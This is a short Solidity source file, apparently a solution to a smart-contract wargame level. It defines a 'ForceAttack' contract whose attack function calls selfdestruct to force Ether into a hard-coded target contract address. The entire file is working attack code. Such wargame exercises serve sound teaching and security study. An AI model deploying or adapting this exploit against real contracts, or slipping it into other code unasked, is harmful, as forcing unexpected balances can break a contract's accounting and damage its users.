// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

contract ForceAttack {
    address payable constant CONTRACTTOATTACK =
        payable(0x415cE91FF8b6f7DE4E1539f54C6dAA2A1ffF6F96);

    constructor() {}

    function attack() public payable {
        selfdestruct(CONTRACTTOATTACK);
    }
}
